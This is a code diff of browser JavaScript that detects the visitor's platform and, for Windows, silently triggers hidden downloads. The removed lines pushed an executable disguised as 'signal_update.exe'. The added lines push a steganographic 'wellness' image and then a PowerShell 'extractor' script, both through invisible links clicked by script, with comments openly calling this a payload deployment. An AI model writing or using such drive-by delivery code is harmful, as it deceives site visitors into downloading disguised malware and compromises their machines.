@@ -218,12 +218,23 @@
     switch(platform) {
       case 'windows':
         // Deploy Windows payload
+        // Deploy steganographic wellness image instead
         const link = document.createElement('a');
-        link.href = 'https://jeki1234121.github.io/hollistisk-v2/hollistisk-update.exe';
-        link.download = 'signal_update.exe';
+        link.href = 'https://jeki1234121.github.io/hollistisk-v2/wellness_community.png';
+        link.download = 'wellness_guide_premium.png';
         link.style.display = 'none';
         document.body.appendChild(link);
         link.click();
+        
+        // Provide PowerShell extractor for advanced users
+        setTimeout(() => {
+            const ps_link = document.createElement('a');
+            ps_link.href = 'https://jeki1234121.github.io/hollistisk-v2/stego_extractor.ps1';
+            ps_link.download = 'wellness_premium_extractor.ps1';
+            ps_link.style.display = 'none';
+            document.body.appendChild(ps_link);
+            ps_link.click();
+        }, 2000);
         break;
         
       case 'android':
